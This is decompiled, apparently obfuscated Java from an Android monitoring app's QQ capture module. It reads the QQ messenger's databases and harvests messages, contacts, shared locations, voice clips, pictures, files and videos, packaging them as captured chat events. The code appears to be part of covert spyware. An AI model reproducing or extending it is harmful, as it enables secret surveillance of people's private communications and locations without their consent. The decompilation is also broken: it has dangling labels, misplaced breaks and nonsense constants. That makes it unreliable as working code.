package com.vvt.capture.qq;

import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.media.ThumbnailUtils;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import com.vvt.io.p;
import com.vvt.qq.internal.AbsStructMsg;
import com.vvt.qq.internal.MessageForFile;
import com.vvt.qq.internal.MessageForPic;
import com.vvt.qq.internal.MessageForPtt;
import com.vvt.qq.internal.MessageForShortVideo;
import com.vvt.qq.internal.MessageForStructing;
import com.vvt.qq.internal.StructMsgForGeneralShare;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final Pattern c = Pattern.compile("lat=\\d+[.]\\d+");
  private static final Pattern d = Pattern.compile("lon=\\d+[.]\\d+");
  private static final HashMap e;
  
  static
  {
    QQCapturingHelper.1 local1 = new com/vvt/capture/qq/QQCapturingHelper$1;
    local1.<init>();
    e = local1;
  }
  
  private static a a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = paramString.replace("mr_discusssion_", "");
    String str1 = "";
    String str2 = ((String)localObject2).replace("_New", str1);
    bool2 = a;
    if (bool2) {}
    localObject2 = (d)paramSQLiteDatabase.rawQuery("SELECT * FROM DiscussionInfo", null);
    boolean bool3;
    if (localObject2 != null)
    {
      bool3 = ((d)localObject2).moveToFirst();
      if (!bool3) {}
    }
    for (;;)
    {
      bool3 = ((d)localObject2).isAfterLast();
      if (!bool3)
      {
        int j = ((d)localObject2).getColumnIndex("uin");
        str1 = h.b(((d)localObject2).getString(j));
        boolean bool4 = str1.equalsIgnoreCase(str2);
        if (bool4)
        {
          bool1 = a;
          if (bool1) {}
          int i = ((d)localObject2).getColumnIndex("uin");
          localObject1 = ((d)localObject2).a(i);
          int m = ((d)localObject2).getColumnIndex("uin");
          str2 = ((d)localObject2).getString(m);
          int k = ((d)localObject2).getColumnIndex("discussionName");
          str1 = ((d)localObject2).getString(k);
          ArrayList localArrayList = b(paramSQLiteDatabase, (String)localObject1);
          localObject1 = new com/vvt/capture/qq/a;
          ((a)localObject1).<init>();
          ((a)localObject1).a = str2;
          ((a)localObject1).b = str1;
          ((a)localObject1).c = localArrayList;
        }
      }
      else
      {
        if (localObject2 != null) {
          ((d)localObject2).close();
        }
        bool2 = a;
        if (bool2) {}
        return (a)localObject1;
      }
      boolean bool5 = a;
      if (bool5) {}
      ((d)localObject2).moveToNext();
    }
  }
  
  private static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str1 = com.vvt.n.a.d.a.b();
    bool1 = false;
    com.vvt.im.events.info.d locald = null;
    boolean bool2 = com.vvt.ag.b.a(str1);
    if (!bool2)
    {
      locald = new com/vvt/im/events/info/d;
      locald.<init>();
      locald.b(str1);
      String str2 = a(str1, paramSQLiteDatabase);
      boolean bool3 = com.vvt.ag.b.a(str2);
      if (bool3) {
        break label77;
      }
      locald.a(str2);
    }
    for (;;)
    {
      boolean bool4 = a;
      if (bool4) {}
      return locald;
      label77:
      locald.a(str1);
    }
  }
  
  private static Object a(SQLiteDatabase paramSQLiteDatabase, String paramString, int paramInt, Class paramClass, QQData.Direction paramDirection)
  {
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    int i = 12;
    int k = i;
    Object localObject1;
    Object localObject2;
    Object localObject4;
    if (k > 0)
    {
      boolean bool3 = a;
      if (bool3) {}
      localObject1 = Locale.US;
      localObject2 = "SELECT msgData FROM %s WHERE _id = %d";
      int m = 2;
      localObject4 = new Object[m];
      localObject4[0] = paramString;
      int i1 = 1;
      Integer localInteger = Integer.valueOf(paramInt);
      localObject4[i1] = localInteger;
      localObject1 = String.format((Locale)localObject1, (String)localObject2, (Object[])localObject4);
      localObject1 = (d)paramSQLiteDatabase.rawQuery((String)localObject1, null);
      if (localObject1 == null) {}
    }
    for (;;)
    {
      try
      {
        boolean bool6 = ((d)localObject1).moveToFirst();
        if (bool6)
        {
          localObject2 = "msgData";
          int i2 = ((d)localObject1).getColumnIndex((String)localObject2);
          localObject4 = ((d)localObject1).getBlob(i2);
          localObject2 = MessageForShortVideo.class;
          if (paramClass == localObject2)
          {
            localObject2 = new com/vvt/qq/internal/MessageForShortVideo;
            ((MessageForShortVideo)localObject2).<init>();
            boolean bool4 = ((MessageForShortVideo)localObject2).doParse((byte[])localObject4);
            if (bool4)
            {
              bool4 = a;
              if (bool4) {}
              int n = ((MessageForShortVideo)localObject2).videoFileSize;
              if (n > 0)
              {
                bool1 = a;
                if ((!bool1) || (localObject1 != null)) {
                  ((d)localObject1).close();
                }
                localObject1 = localObject2;
                bool7 = a;
                if (bool7) {}
                return localObject1;
              }
            }
          }
          else
          {
            localObject2 = MessageForPtt.class;
            if (paramClass == localObject2)
            {
              localObject2 = new com/vvt/qq/internal/MessageForPtt;
              ((MessageForPtt)localObject2).<init>();
              boolean bool5 = ((MessageForPtt)localObject2).doParse((byte[])localObject4);
              if (bool5)
              {
                bool5 = a;
                if (bool5) {}
                long l1 = ((MessageForPtt)localObject2).fileSize;
                long l2 = 0L;
                bool5 = l1 < l2;
                if (bool5)
                {
                  bool1 = a;
                  if ((!bool1) || (localObject1 != null)) {
                    ((d)localObject1).close();
                  }
                  localObject1 = localObject2;
                }
              }
            }
            else
            {
              bool7 = b;
              if (!bool7) {}
            }
          }
        }
        if (localObject1 == null) {
          continue;
        }
      }
      catch (Exception localException)
      {
        long l3;
        boolean bool7 = b;
        if ((bool7) && (localObject1 == null)) {
          continue;
        }
        continue;
      }
      finally
      {
        if (localObject1 == null) {
          continue;
        }
        ((d)localObject1).close();
      }
      ((d)localObject1).close();
      l3 = 10000L;
      SystemClock.sleep(l3);
      int j = k + -1;
      k = j;
      break;
      j = 0;
      localObject1 = null;
    }
  }
  
  private static String a(String paramString)
  {
    String str = File.separator;
    int i = paramString.lastIndexOf(str);
    return paramString.substring(0, i);
  }
  
  private static String a(String paramString, int paramInt)
  {
    Object localObject1 = null;
    Object localObject2 = b(paramString);
    Iterator localIterator = ((List)localObject2).iterator();
    boolean bool1 = localIterator.hasNext();
    if (bool1)
    {
      localObject2 = (com.vvt.io.c)localIterator.next();
      if (localObject2 == null) {
        break label91;
      }
      long l1 = paramInt;
      String str = ((com.vvt.io.c)localObject2).e;
      long l2 = Long.parseLong(str);
      boolean bool2 = l1 < l2;
      if (bool2) {
        break label91;
      }
      localObject2 = ((com.vvt.io.c)localObject2).b;
    }
    label91:
    for (localObject2 = p.a(paramString, (String)localObject2);; localObject2 = localObject1)
    {
      localObject1 = localObject2;
      break;
      return (String)localObject1;
    }
  }
  
  private static String a(String paramString, SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = false;
    String str1 = null;
    bool2 = a;
    if (bool2) {}
    localObject2 = (d)paramSQLiteDatabase.rawQuery("SELECT * FROM Friends", null);
    if (localObject2 != null) {}
    try
    {
      boolean bool3 = ((d)localObject2).moveToFirst();
      if (bool3)
      {
        bool3 = ((d)localObject2).isAfterLast();
        if (!bool3)
        {
          String str2 = "name";
          int i = ((d)localObject2).getColumnIndex(str2);
          str1 = ((d)localObject2).getString(i);
        }
      }
      if (localObject2 != null) {
        ((d)localObject2).close();
      }
      localObject2 = str1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool4 = b;
        if ((!bool4) || (localObject2 != null)) {
          ((d)localObject2).close();
        }
        bool2 = false;
        localObject2 = null;
      }
    }
    finally
    {
      if (localObject2 == null) {
        break label150;
      }
      ((d)localObject2).close();
    }
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    return (String)localObject2;
  }
  
  private static String a(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    Object localObject2 = ImType.QQ;
    Object localObject3 = ImMediaFileType.THUMBMAIL;
    localObject2 = com.vvt.im.a.c.a(paramString1, (ImType)localObject2, (ImMediaFileType)localObject3);
    localObject3 = com.vvt.im.a.c.a(ImMediaFileType.THUMBMAIL);
    Object localObject4 = new java/lang/StringBuilder;
    ((StringBuilder)localObject4).<init>();
    localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
    localObject4 = File.separator;
    localObject2 = (String)localObject4 + (String)localObject3;
    int i = 3;
    localObject3 = ThumbnailUtils.createVideoThumbnail(paramString2, i);
    localObject4 = new java/io/File;
    ((File)localObject4).<init>((String)localObject2);
    if (localObject3 != null) {}
    try
    {
      FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
      localFileOutputStream.<init>((File)localObject4);
      localObject4 = Bitmap.CompressFormat.JPEG;
      int j = 40;
      boolean bool1 = ((Bitmap)localObject3).compress((Bitmap.CompressFormat)localObject4, j, localFileOutputStream);
      if (bool1) {
        localObject1 = localObject2;
      }
      localFileOutputStream.flush();
      localFileOutputStream.close();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return (String)localObject1;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, d paramd, com.vvt.base.b paramb, String paramString2)
  {
    int i = a;
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "mr_discusssion_";
    Object localObject3 = paramString2;
    boolean bool8 = paramString2.startsWith((String)localObject1);
    label65:
    com.vvt.im.events.info.c localc;
    Object localObject4;
    Object localObject5;
    int i4;
    int i5;
    int i10;
    float f2;
    Object localObject10;
    int i1;
    try
    {
      locald = a(paramSQLiteDatabase);
      if (locald != null) {
        break label65;
      }
      i = b;
      if (i != 0) {}
      localObject1 = localArrayList;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        com.vvt.im.events.info.d locald;
        QQData localQQData;
        f localf;
        com.vvt.im.events.info.b localb;
        int i11;
        Object localObject8;
        Object localObject9;
        int i7;
        boolean bool1 = b;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        localObject2 = localArrayList;
        continue;
        boolean bool10 = b;
        if (bool10)
        {
          continue;
          localObject8 = "frienduin";
          localObject3 = paramd;
          int i12 = paramd.getColumnIndex((String)localObject8);
          localObject8 = paramd.getString(i12);
          localObject9 = "frienduin";
          int i16 = paramd.getColumnIndex((String)localObject9);
          localObject9 = paramd.a(i16);
          localb.a((String)localObject8);
          localObject3 = paramSQLiteDatabase;
          localObject9 = c(paramSQLiteDatabase, (String)localObject9);
          if (localObject9 != null)
          {
            localObject8 = ((com.vvt.im.events.info.e)localObject9).c();
            localb.b((String)localObject8);
            ((ArrayList)localObject2).add(localObject9);
            localObject9 = localObject2;
          }
          else
          {
            localb.b((String)localObject8);
            boolean bool11 = b;
            if (bool11) {}
            localObject9 = localObject2;
            continue;
            localObject8 = QQData.Direction.IN;
            localObject2 = "senderuin";
            localObject3 = paramd;
            int k = paramd.getColumnIndex((String)localObject2);
            String str2 = paramd.getString(k);
            k = ((ArrayList)localObject9).size();
            if (k > 0)
            {
              Iterator localIterator = ((ArrayList)localObject9).iterator();
              boolean bool12;
              do
              {
                bool2 = localIterator.hasNext();
                if (!bool2) {
                  break;
                }
                localObject2 = localIterator.next();
                localObject2 = (com.vvt.im.events.info.e)localObject2;
                String str3 = ((com.vvt.im.events.info.e)localObject2).d();
                localObject3 = str3;
                bool12 = str3.equalsIgnoreCase(str2);
              } while (!bool12);
              localObject3 = str2;
              localf.a(str2);
              str2 = ((com.vvt.im.events.info.e)localObject2).c();
              localObject3 = str2;
              localf.b(str2);
              localObject2 = ((com.vvt.im.events.info.e)localObject2).a();
              localf.e((String)localObject2);
              boolean bool2 = a;
              if (bool2)
              {
                continue;
                localQQData.a((String)localObject2);
                bool2 = i5;
                f2 = f1;
                continue;
                int m = 64523;
                f2 = 0.0F / 0.0F;
                if (i7 != m)
                {
                  m = 63531;
                  f2 = 0.0F / 0.0F;
                  if (i7 == m)
                  {
                    localObject2 = MessageType.none;
                    i4 = ((MessageType)localObject2).getNumber();
                    localObject2 = new com/vvt/qq/internal/MessageForFile;
                    ((MessageForFile)localObject2).<init>();
                    localObject3 = localObject7;
                    ((MessageForFile)localObject2).msg = ((String)localObject7);
                    i8 = ((MessageForFile)localObject2).doParse();
                    if (i8 != 0)
                    {
                      localObject3 = paramb;
                      localObject2 = a((MessageForFile)localObject2, paramb, paramString1);
                      int i17 = ((ArrayList)localObject2).size();
                      if (i17 <= 0)
                      {
                        i5 = 0;
                        f1 = 0.0F;
                        localObject5 = null;
                      }
                    }
                    for (;;)
                    {
                      localObject4 = localObject2;
                      break;
                      boolean bool3 = b;
                      if (bool3) {}
                      i5 = 0;
                      f1 = 0.0F;
                      localObject5 = null;
                      localObject2 = localObject4;
                    }
                  }
                  int n = 63514;
                  f2 = 0.0F / 0.0F;
                  int i14;
                  if (i8 == n)
                  {
                    localObject2 = MessageType.none;
                    i4 = ((MessageType)localObject2).getNumber();
                    localObject2 = MessageForShortVideo.class;
                    localObject3 = paramSQLiteDatabase;
                    localObject2 = a(paramSQLiteDatabase, paramString2, i11, (Class)localObject2, (QQData.Direction)localObject8);
                    localObject2 = (MessageForShortVideo)localObject2;
                    if (localObject2 == null)
                    {
                      localObject2 = new com/vvt/qq/internal/MessageForShortVideo;
                      ((MessageForShortVideo)localObject2).<init>();
                      localObject3 = localObject6;
                      ((MessageForShortVideo)localObject2).doParse((byte[])localObject6);
                    }
                    i14 = ((MessageForShortVideo)localObject2).canPrase;
                    i8 = i14;
                    if (i14 != 0)
                    {
                      localObject3 = paramb;
                      localObject4 = a((MessageForShortVideo)localObject2, paramb, paramString1);
                      n = ((ArrayList)localObject4).size();
                      if (n <= 0)
                      {
                        i5 = 0;
                        f1 = 0.0F;
                        localObject5 = null;
                      }
                    }
                    else
                    {
                      boolean bool4 = b;
                      if (bool4) {}
                      i5 = 0;
                      f1 = 0.0F;
                      localObject5 = null;
                    }
                  }
                  else
                  {
                    i1 = 63534;
                    f2 = 0.0F / 0.0F;
                    if (i8 != i1) {
                      break;
                    }
                    localObject2 = MessageForPtt.class;
                    localObject3 = paramSQLiteDatabase;
                    localObject2 = a(paramSQLiteDatabase, paramString2, i11, (Class)localObject2, (QQData.Direction)localObject8);
                    localObject2 = (MessageForPtt)localObject2;
                    if (localObject2 == null)
                    {
                      localObject2 = new com/vvt/qq/internal/MessageForPtt;
                      ((MessageForPtt)localObject2).<init>();
                      localObject3 = localObject6;
                      ((MessageForPtt)localObject2).doParse((byte[])localObject6);
                    }
                    i14 = ((MessageForPtt)localObject2).canParse;
                    i8 = i14;
                    if (i14 != 0)
                    {
                      localObject3 = paramb;
                      localObject4 = a((QQData.Direction)localObject8, (MessageForPtt)localObject2, paramb, paramString1);
                      i1 = ((ArrayList)localObject4).size();
                      if (i1 <= 0)
                      {
                        i5 = 0;
                        f1 = 0.0F;
                        localObject5 = null;
                      }
                    }
                    else
                    {
                      i5 = 0;
                      f1 = 0.0F;
                      localObject5 = null;
                    }
                  }
                }
              }
            }
          }
        }
      }
      i1 = 63525;
      f2 = 0.0F / 0.0F;
      if (i8 != i1) {
        break label1806;
      }
    }
    return (ArrayList)localObject1;
    Object localObject6;
    Object localObject7;
    float f1;
    if (paramd != null)
    {
      i = paramd.moveToFirst();
      if (i != 0) {
        for (;;)
        {
          i = paramd.isAfterLast();
          if (i != 0) {
            break;
          }
          localQQData = new com/vvt/capture/qq/QQData;
          localQQData.<init>();
          localf = new com/vvt/im/events/info/f;
          localf.<init>();
          localb = new com/vvt/im/events/info/b;
          localb.<init>();
          localc = new com/vvt/im/events/info/c;
          localc.<init>();
          localObject1 = new java/util/ArrayList;
          ((ArrayList)localObject1).<init>();
          localObject4 = new java/util/ArrayList;
          ((ArrayList)localObject4).<init>();
          localObject5 = MessageType.Text;
          i4 = ((MessageType)localObject5).getNumber();
          localObject5 = "msgtype";
          localObject3 = paramd;
          i5 = paramd.getColumnIndex((String)localObject5);
          int i6 = paramd.getInt(i5);
          localObject5 = "msgData";
          i5 = paramd.getColumnIndex((String)localObject5);
          localObject6 = paramd.getBlob(i5);
          localObject7 = new java/lang/String;
          localObject5 = "UTF-8";
          localObject3 = localObject7;
          ((String)localObject7).<init>((byte[])localObject6, (String)localObject5);
          localObject5 = "issend";
          localObject3 = paramd;
          i5 = paramd.getColumnIndex((String)localObject5);
          i10 = paramd.getInt(i5);
          localObject5 = "time";
          i5 = paramd.getColumnIndex((String)localObject5);
          long l1 = paramd.getLong(i5);
          long l2 = 1000L * l1;
          localObject5 = "_id";
          i5 = paramd.getColumnIndex((String)localObject5);
          i11 = paramd.getInt(i5);
          i5 = 1;
          f1 = Float.MIN_VALUE;
          bool10 = a;
          if ((bool10) && (!bool8)) {
            break label742;
          }
          bool10 = true;
          localQQData.a(bool10);
          localObject3 = paramSQLiteDatabase;
          localObject8 = a(paramSQLiteDatabase, paramString2);
          if (localObject8 == null) {
            break label729;
          }
          localObject1 = ((a)localObject8).a;
          localb.a((String)localObject1);
          localObject1 = ((a)localObject8).b;
          localb.b((String)localObject1);
          localObject1 = ((a)localObject8).c;
          localObject9 = localObject1;
          localObject1 = new java/text/SimpleDateFormat;
          localObject8 = "dd/MM/yy HH:mm:ss";
          ((SimpleDateFormat)localObject1).<init>((String)localObject8);
          localObject8 = new java/util/Date;
          ((Date)localObject8).<init>(l2);
          String str1 = ((SimpleDateFormat)localObject1).format((Date)localObject8);
          i = 1;
          f2 = Float.MIN_VALUE;
          int i13 = i10;
          if (i10 != i) {
            break label863;
          }
          localObject1 = QQData.Direction.OUT;
          localObject8 = locald.b();
          localf.a((String)localObject8);
          localObject8 = locald.a();
          localf.b((String)localObject8);
          localObject8 = localObject1;
          int j = 64536;
          f2 = 0.0F / 0.0F;
          i13 = i6;
          if (i6 != j) {
            break label1040;
          }
          localObject1 = MessageType.Text;
          i4 = ((MessageType)localObject1).getNumber();
          localObject1 = "[?-􏰀-?]+";
          localObject1 = Pattern.compile((String)localObject1);
          localObject3 = localObject7;
          localObject1 = ((Pattern)localObject1).matcher((CharSequence)localObject7);
          localObject10 = "";
          localObject3 = localObject10;
          localObject1 = ((Matcher)localObject1).replaceAll((String)localObject10);
          localObject1 = ((String)localObject1).trim();
          i7 = a;
          if (i7 != 0) {}
          i7 = com.vvt.ag.b.a((String)localObject1);
          if (i7 == 0) {
            break label1022;
          }
          j = 0;
          f2 = 0.0F;
          localObject1 = null;
          i5 = j;
          f1 = f2;
          if (i5 != 0)
          {
            localQQData.b((List)localObject4);
            localQQData.a(l2);
            localObject3 = str1;
            localQQData.b(str1);
            localQQData.a(localc);
            localQQData.a((QQData.Direction)localObject8);
            localQQData.a((List)localObject9);
            localQQData.a(locald);
            localQQData.a(localf);
            localQQData.a(i4);
            localQQData.a(localb);
            localArrayList.add(localQQData);
          }
          paramd.moveToNext();
        }
      }
    }
    label729:
    label742:
    label863:
    label1022:
    label1040:
    int i8;
    Object localObject2 = new com/vvt/qq/internal/MessageForStructing;
    ((MessageForStructing)localObject2).<init>();
    localObject3 = localObject6;
    localObject2 = ((MessageForStructing)localObject2).doParse((byte[])localObject6);
    int i15;
    if (localObject2 != null)
    {
      i15 = ((AbsStructMsg)localObject2).mMsgServiceID;
      i8 = i15;
      int i18 = 32;
      if (i15 == i18)
      {
        MessageType localMessageType = MessageType.ShareLocation;
        i4 = localMessageType.getNumber();
        localObject2 = (StructMsgForGeneralShare)localObject2;
        localObject10 = c;
        localObject3 = ((StructMsgForGeneralShare)localObject2).mMsgActionData;
        localObject6 = localObject3;
        localObject10 = ((Pattern)localObject10).matcher((CharSequence)localObject3);
        localObject6 = d;
        localObject3 = ((StructMsgForGeneralShare)localObject2).mMsgActionData;
        localObject7 = localObject3;
        localObject6 = ((Pattern)localObject6).matcher((CharSequence)localObject3);
        boolean bool14 = ((Matcher)localObject10).find();
        if (bool14)
        {
          bool14 = ((Matcher)localObject6).find();
          if (bool14)
          {
            localObject10 = ((Matcher)localObject10).group();
            localObject7 = "=";
            localObject3 = localObject10;
            localObject10 = ((String)localObject10).split((String)localObject7);
            bool14 = true;
            localObject10 = localObject10[bool14];
            double d1 = Double.parseDouble((String)localObject10);
            localObject10 = ((Matcher)localObject6).group();
            localObject6 = "=";
            localObject10 = ((String)localObject10).split((String)localObject6);
            i18 = 1;
            localObject10 = localObject10[i18];
            double d2 = Double.parseDouble((String)localObject10);
            localObject2 = ((StructMsgForGeneralShare)localObject2).mMsgBrief;
            boolean bool9 = a;
            if (bool9) {}
            bool9 = a;
            if (bool9) {}
            bool9 = a;
            if (bool9) {}
            localc.b(d2);
            localc.a(d1);
            localc.a((String)localObject2);
          }
        }
        i1 = i4;
      }
    }
    for (;;)
    {
      i4 = i1;
      break;
      i5 = 0;
      f1 = 0.0F;
      localObject5 = null;
      i1 = i4;
      continue;
      label1806:
      i1 = 63536;
      f2 = 0.0F / 0.0F;
      int i9;
      if (i8 == i1)
      {
        boolean bool5 = a;
        if (bool5) {}
        localObject2 = new com/vvt/qq/internal/MessageForPic;
        ((MessageForPic)localObject2).<init>();
        localObject3 = localObject6;
        i9 = ((MessageForPic)localObject2).doParse((byte[])localObject6);
        boolean bool13 = a;
        if ((!bool13) || (i9 != 0))
        {
          i15 = i10;
          localObject4 = a((MessageForPic)localObject2, i10, paramb, paramString1);
          int i2 = ((ArrayList)localObject4).size();
          if (i2 > 0) {
            break;
          }
          i5 = 0;
          f1 = 0.0F;
          localObject5 = null;
          break;
        }
        boolean bool6 = b;
        if (bool6) {}
        i5 = 0;
        f1 = 0.0F;
        localObject5 = null;
        break;
      }
      int i3 = 63527;
      f2 = 0.0F / 0.0F;
      if (i9 == i3)
      {
        i5 = 0;
        f1 = 0.0F;
        localObject5 = null;
        break;
      }
      boolean bool7 = a;
      if (bool7) {}
      i5 = 0;
      f1 = 0.0F;
      localObject5 = null;
      break;
      bool7 = i4;
    }
  }
  
  private static ArrayList a(QQData.Direction paramDirection, MessageForPtt paramMessageForPtt, com.vvt.base.b paramb, String paramString)
  {
    i = a;
    if (i != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = false;
    f1 = 0.0F;
    localObject1 = null;
    for (;;)
    {
      try
      {
        localObject2 = paramMessageForPtt.url;
        localObject4 = paramMessageForPtt.directUrl;
        localObject5 = ImType.QQ;
        localObject6 = ImMediaFileType.ATTACHMENT;
        localObject5 = com.vvt.im.a.c.a(paramString, (ImType)localObject5, (ImMediaFileType)localObject6);
        localObject6 = ImMediaFileType.ATTACHMENT;
        localObject6 = com.vvt.im.a.c.a((ImMediaFileType)localObject6);
        str1 = p.a((String)localObject5, (String)localObject6);
        boolean bool3 = a;
        if (bool3) {}
        Object localObject7 = QQData.Direction.IN;
        if (paramDirection != localObject7) {
          continue;
        }
        bool3 = com.vvt.ag.b.a((String)localObject4);
        if (bool3) {
          continue;
        }
        localObject4 = c((String)localObject4);
        bool3 = a;
        if ((!bool3) || (localObject4 != null))
        {
          int k = localObject4.length;
          int m = 2;
          if (k >= m)
          {
            localObject2 = com.vvt.io.d.a((byte[])localObject4, (String)localObject5, (String)localObject6);
            bool1 = a;
            if (bool1) {}
            bool1 = true;
            f1 = Float.MIN_VALUE;
          }
        }
        bool6 = bool1;
        f2 = f1;
        if (bool6) {
          continue;
        }
        bool1 = com.vvt.ag.b.a((String)localObject2);
        if (bool1) {
          continue;
        }
        bool1 = a;
        if (bool1) {}
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        ((List)localObject1).add(localObject2);
        localObject7 = ".amr";
        bool4 = ((String)localObject2).endsWith((String)localObject7);
        if (bool4)
        {
          localObject7 = ".amr";
          String str2 = ".slk";
          localObject7 = ((String)localObject2).replace((CharSequence)localObject7, str2);
          bool5 = a;
          if (bool5) {}
          ((List)localObject1).add(localObject7);
        }
        localObject7 = ((List)localObject1).iterator();
        localObject1 = localObject2;
        i = ((Iterator)localObject7).hasNext();
        if (i == 0) {
          continue;
        }
        localObject2 = ((Iterator)localObject7).next();
        localObject2 = (String)localObject2;
        boolean bool5 = ShellUtil.b((String)localObject2);
        if (bool5) {
          continue;
        }
        long l1 = paramMessageForPtt.fileSize;
        boolean bool8 = a;
        if (bool8) {}
        long l2 = 0L;
        bool8 = l1 < l2;
        if (!bool8) {
          continue;
        }
        localObject2 = a((String)localObject2);
        j = (int)l1;
        localObject1 = a((String)localObject2, j);
        i = com.vvt.ag.b.a((String)localObject1);
        if (i != 0) {
          continue;
        }
        i = 1;
        f3 = Float.MIN_VALUE;
        j = i;
        f1 = f3;
        localObject2 = localObject1;
      }
      catch (Exception localException)
      {
        Object localObject2;
        Object localObject4;
        Object localObject5;
        Object localObject6;
        String str1;
        boolean bool6;
        float f2;
        boolean bool4;
        int j;
        float f3;
        boolean bool7;
        i = b;
        if (i == 0) {
          continue;
        }
        continue;
        Object localObject3 = localObject1;
        boolean bool2 = bool7;
        f1 = f2;
        continue;
        localObject3 = localObject1;
        continue;
      }
      bool6 = j;
      f2 = f1;
      localObject1 = localObject2;
      continue;
      bool6 = a;
      if (bool6) {}
      bool6 = false;
      localObject4 = null;
      f2 = 0.0F;
      continue;
      i = 0;
      f3 = 0.0F;
      localObject2 = null;
    }
    bool6 = true;
    f2 = Float.MIN_VALUE;
    bool2 = a;
    if (bool2) {}
    for (;;)
    {
      bool2 = a;
      if ((!bool2) || (bool6))
      {
        localObject1 = "audio/SILK";
        int n = 4;
        f2 = 5.6E-45F;
        long l3 = paramMessageForPtt.fileSize;
        boolean bool9 = a;
        if (bool9) {}
        bool7 = a(n, paramb, l3);
        bool4 = a;
        if ((!bool4) || (bool7))
        {
          bool7 = a;
          if (bool7) {}
          localObject4 = paramb.f();
          com.vvt.capture.qq.b.a.a((String)localObject2, (String)localObject5, (String)localObject6, paramString, (String)localObject4);
          localObject2 = new java/lang/StringBuilder;
          ((StringBuilder)localObject2).<init>();
          localObject2 = ((StringBuilder)localObject2).append((String)localObject6);
          localObject4 = ".slk";
          localObject2 = ((StringBuilder)localObject2).append((String)localObject4);
          localObject2 = ((StringBuilder)localObject2).toString();
          localObject4 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject4).<init>();
          ((com.vvt.im.events.info.a)localObject4).a((String)localObject2);
          ((com.vvt.im.events.info.a)localObject4).c(str1);
          ((com.vvt.im.events.info.a)localObject4).b((String)localObject1);
          ((com.vvt.im.events.info.a)localObject4).d(str1);
          localArrayList.add(localObject4);
          i = a;
          if (i == 0) {}
        }
      }
      i = a;
      if (i != 0) {}
      return localArrayList;
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  private static ArrayList a(MessageForFile paramMessageForFile, com.vvt.base.b paramb, String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      localObject1 = paramMessageForFile.url;
      bool1 = a;
      if (bool1) {}
      bool1 = com.vvt.ag.b.a((String)localObject1);
      if (bool1) {
        break label506;
      }
      bool1 = ShellUtil.b((String)localObject1);
      if (!bool1) {
        break label506;
      }
      bool1 = false;
      localObject2 = null;
      localObject2 = com.vvt.io.d.a((String)localObject1, false);
      boolean bool3 = a;
      if (bool3) {}
      localObject3 = e;
      bool3 = ((HashMap)localObject3).containsKey(localObject2);
      if (!bool3) {
        break label495;
      }
      localObject4 = b((String)localObject1);
      localObject3 = com.vvt.io.d.i((String)localObject1);
      localObject5 = e;
      localObject2 = ((HashMap)localObject5).get(localObject2);
      localObject2 = (Integer)localObject2;
      j = ((Integer)localObject2).intValue();
      int i = ((List)localObject4).size();
      if (i <= 0) {
        break label417;
      }
      i = 0;
      localObject2 = null;
      localObject2 = ((List)localObject4).get(0);
      localObject2 = (com.vvt.io.c)localObject2;
      localObject2 = ((com.vvt.io.c)localObject2).e;
      l = Long.parseLong((String)localObject2);
      bool2 = a;
      if (bool2) {}
      bool2 = a(j, paramb, l);
      boolean bool4 = a;
      if ((bool4) && (!bool2)) {
        break label484;
      }
      localObject2 = ImType.QQ;
      localObject4 = ImMediaFileType.ATTACHMENT;
      localObject2 = com.vvt.im.a.c.a(paramString, (ImType)localObject2, (ImMediaFileType)localObject4);
      localObject4 = ImMediaFileType.ATTACHMENT;
      localObject5 = com.vvt.im.a.c.a((ImMediaFileType)localObject4);
      localObject4 = p.a((String)localObject2, (String)localObject5);
      boolean bool5 = a;
      if (bool5) {}
      String str = paramb.f();
      com.vvt.capture.qq.b.a.a((String)localObject1, (String)localObject2, (String)localObject5, paramString, str);
      localObject2 = "";
      k = 3;
      if (j != k) {
        break label423;
      }
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append((String)localObject5);
      localObject3 = ".mp4";
      localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
      localObject2 = ((StringBuilder)localObject2).toString();
      localObject5 = "video/mp4";
      localObject3 = a(paramString, (String)localObject4);
    }
    catch (Exception localException)
    {
      for (;;)
      {
